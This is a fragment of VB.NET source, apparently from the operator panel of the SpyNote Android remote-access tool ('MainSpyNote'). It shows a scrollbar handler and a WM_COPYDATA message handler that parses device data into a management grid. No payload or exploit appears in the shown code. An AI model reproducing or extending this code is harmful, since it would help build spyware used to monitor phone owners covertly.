        Try
            If (Me.DataMonitorAndroidView.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.DataMonitorAndroidView.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar5.Value
            End If
        Catch exception As System.Exception
            If (Me.DataMonitorAndroidView.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.DataMonitorAndroidView.FirstDisplayedScrollingRowIndex = Me.DataMonitorAndroidView.RowCount - 1
            End If
        End Try
    End Sub

    Protected Overrides Sub WndProc(ByRef m As Message)
        If (m.Msg = 74) Then
            Dim [structure] As MainSpyNote.COPYDATASTRUCT = DirectCast(Marshal.PtrToStructure(m.LParam, GetType(MainSpyNote.COPYDATASTRUCT)), MainSpyNote.COPYDATASTRUCT)
            Try
                Dim item As devices = DirectCast(My.Application.OpenForms("devices"), devices)
                If (item Is Nothing) Then
                    Return
                Else
                    Dim strArrays As String() = [structure].lpData.Split(New String() {Me.SPL1}, StringSplitOptions.RemoveEmptyEntries)
                    If (Operators.CompareString(strArrays(0), "unknowndevises", False) = 0) Then
                        item.Text = "unknown devises"
                        item.PictureLoading.Visible = False
                    Else
                        item.PictureLoading.Visible = False
                        item.HNDL = Conversions.ToInteger(strArrays(1))
                        Dim strArrays1 As String() = strArrays(0).Split(New String() {Me.SPL}, StringSplitOptions.RemoveEmptyEntries)
                        Dim length As Integer = CInt(strArrays1.Length) - 1
                        For i As Integer = 0 To length Step 1
                            Dim strArrays2 As String() = strArrays1(i).Split(New String() {":"}, StringSplitOptions.RemoveEmptyEntries)
                            item.ViewManager.Rows.Add(New Object() {Store.Bitmap_0("Screen\ScreenOn"), strArrays2(2)})
                            Dim count As Integer = item.ViewManager.Rows.Count - 1
                            item.ViewManager.Rows(count).Cells(1).Tag = strArrays2(0)
                        Next
                    End If
                End If
            Catch exception As System.Exception
            End Try
        End If
        MyBase.WndProc(m)
    End Sub

    Private Structure COPYDATASTRUCT
        Public dwData As IntPtr

        Public cbData As Integer

        Public lpData As String
    End Structure
End Class